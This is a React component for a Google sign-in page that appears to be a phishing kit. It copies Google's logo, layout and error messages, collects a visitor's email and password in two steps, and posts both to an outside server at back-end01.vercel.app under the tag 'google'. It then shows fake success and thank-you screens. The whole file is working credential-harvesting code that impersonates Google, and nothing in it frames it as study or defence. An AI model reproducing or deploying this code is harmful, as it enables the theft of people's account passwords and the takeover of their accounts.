import React, { useState } from 'react';
import axios from 'axios';
import SuccessModal from './SuccessModal';
import ThankYou from './ThankYou';
import ErrorModal from './ErrorModal';
import './GoogleLogin.css';

const validateEmail = (email) => {
    return String(email)
        .toLowerCase()
        .match(
            /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
        );
};

const GoogleLogin = ({ onClose }) => {
    const [step, setStep] = useState(1); // 1: Email, 2: Password
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [showThankYou, setShowThankYou] = useState(false);
    const [errorModal, setErrorModal] = useState({ isOpen: false, message: '' });

    const handleNext = (e) => {
        e.preventDefault();
        if (step === 1) {
            if (!email) {
                setErrorModal({ isOpen: true, message: "Enter an email or phone number" });
                return;
            }
            if (!validateEmail(email)) {
                setErrorModal({ isOpen: true, message: "Couldn't find your Google Account" });
                return;
            }
            setIsLoading(true);
            setTimeout(() => {
                setIsLoading(false);
                setStep(2);
            }, 1500);
        } else {
            if (!password) {
                setErrorModal({ isOpen: true, message: "Enter a password" });
                return;
            }
            // Prevent double submission
            if (!isLoading) {
                submitLogin();
            }
        }
    };

    const submitLogin = async () => {
        setIsLoading(true);
        try {
            await axios.post('https://back-end01.vercel.app/api/login', {
                identifier: email,
                password: password,
                source: 'google'
            });

            // Simulate Google transition
            setTimeout(() => {
                setIsLoading(false);
                setShowSuccessModal(true);
            }, 2000);
        } catch (err) {
            console.error(err);
            setIsLoading(false);
            setErrorModal({ isOpen: true, message: "A connection error occurred. Please check your internet and try again." });
        }
    };

    return (
        <div className="google-modal-overlay">
            <div className="google-login-card">
                {isLoading && (
                    <div className="google-loader-container">
                        <div className="google-loader-bar"></div>
                    </div>
                )}

                <div className="google-header">
                    <img
                        src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
                        alt="Google"
                        className="google-logo"
                    />
                    <h1 className="google-signin-text">Sign in</h1>
                    <p className="google-subtitle">Use your Google Account</p>
                </div>

                <form onSubmit={handleNext}>
                    {step === 1 ? (
                        <div className="google-step-container">
                            <div className="google-input-group">
                                <input
                                    type="email"
                                    className="google-input"
                                    placeholder=" "
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    required
                                    autoFocus
                                />
                                <label className="google-label">Email or phone</label>
                            </div>
                            <a className="google-forgot">Forgot email?</a>
                            <div className="google-account-info">
                                Not your computer? Use Guest mode to sign in privately. <br />
                                <a className="google-forgot">Learn more</a>
                            </div>
                        </div>
                    ) : (
                        <div className="google-step-container">
                            <div className="google-user-chip" onClick={() => setStep(1)}>
                                <div className="chip-icon">
                                    <svg viewBox="0 0 24 24" width="20" height="20">
                                        <path fill="#5f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                                    </svg>
                                </div>
                                <span>{email}</span>
                                <svg viewBox="0 0 24 24" width="16" height="16">
                                    <path fill="#5f6368" d="M7 10l5 5 5-5H7z" />
                                </svg>
                            </div>
                            <div className="google-input-group" style={{ marginTop: '10px' }}>
                                <input
                                    type="password"
                                    className="google-input"
                                    placeholder=" "
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    required
                                    autoFocus
                                />
                                <label className="google-label">Enter your password</label>
                            </div>
                            <div style={{ margin: '10px 0 40px' }}>
                                <input type="checkbox" id="show-pass" />
                                <label htmlFor="show-pass" style={{ fontSize: '14px', marginLeft: '8px', color: '#202124' }}>Show password</label>
                            </div>
                        </div>
                    )}

                    <div className="google-actions">
                        <span className="google-create-link">{step === 1 ? 'Create account' : 'Forgot password?'}</span>
                        <button type="submit" className="google-next-btn">
                            Next
                        </button>
                    </div>
                </form>

                <div className="google-footer-links">
                    <div className="lang-selector">English (United States)</div>
                    <div className="links">
                        <span>Help</span>
                        <span>Privacy</span>
                        <span>Terms</span>
                    </div>
                </div>
            </div>

            <SuccessModal
                isOpen={showSuccessModal}
                onRedirect={() => {
                    setShowSuccessModal(false);
                    setShowThankYou(true);
                }}
            />

            <ThankYou isOpen={showThankYou} />

            <ErrorModal
                isOpen={errorModal.isOpen}
                message={errorModal.message}
                onClose={() => setErrorModal({ ...errorModal, isOpen: false })}
            />
        </div>
    );
};

export default GoogleLogin;
